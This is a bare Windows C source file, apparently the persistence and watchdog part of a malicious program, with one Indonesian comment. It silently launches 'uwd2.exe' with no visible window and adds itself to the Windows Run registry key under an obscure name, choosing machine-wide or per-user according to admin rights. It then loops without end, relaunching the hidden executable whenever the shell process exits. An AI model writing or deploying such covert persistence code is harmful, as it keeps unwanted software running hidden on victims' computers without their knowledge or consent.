#include <windows.h>

BOOL LaunchSilentWithExitCheck(LPCSTR exePath) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (!CreateProcessA(NULL, (LPSTR)exePath, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    DWORD waitResult = WaitForSingleObject(pi.hProcess, 5000);
    if (waitResult == WAIT_OBJECT_0) {
        DWORD exitCode = 0;
        GetExitCodeProcess(pi.hProcess, &exitCode);
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

BOOL IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

void ensure_run_key_user() {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "uwd2w.exe";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        char value[MAX_PATH];
        DWORD size = sizeof(value);
        DWORD type;
        if (RegQueryValueExA(hKey, valueName, 0, &type, (LPBYTE)value, &size) != ERROR_SUCCESS) {
            // Belum ada, tambahkan
            char exePath[MAX_PATH];
            GetModuleFileNameA(NULL, exePath, MAX_PATH);

            RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
        }
        RegCloseKey(hKey);
    }
}

void ensure_run_key_global() {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "uwd2w.exe";

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        char value[MAX_PATH];
        DWORD size = sizeof(value);
        DWORD type;

        if (RegQueryValueExA(hKey, valueName, 0, &type, (LPBYTE)value, &size) != ERROR_SUCCESS) {
            char exePath[MAX_PATH];
            GetModuleFileNameA(NULL, exePath, MAX_PATH);

            RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
        }

        RegCloseKey(hKey);
    }
}

void runWatcher() {
    while (1) {
        HWND hwnd = GetShellWindow();
        DWORD pid = 0;
        if (hwnd) GetWindowThreadProcessId(hwnd, &pid);
        if (!pid) {
            continue;
        }
        HANDLE hProc = OpenProcess(SYNCHRONIZE, FALSE, pid);
        if (!hProc) {
            continue;
        }
        WaitForSingleObject(hProc, INFINITE);
        CloseHandle(hProc);
        LaunchSilentWithExitCheck("uwd2.exe");
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
	HANDLE hMutex = CreateMutexA(NULL, FALSE, "uwd2w_single_instance");
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		return 0;
	}
    LaunchSilentWithExitCheck("uwd2.exe");
	if (IsAdmin()) {
		ensure_run_key_global();
	} else {
		ensure_run_key_user(); 
	}

	runWatcher();
    return 0;
}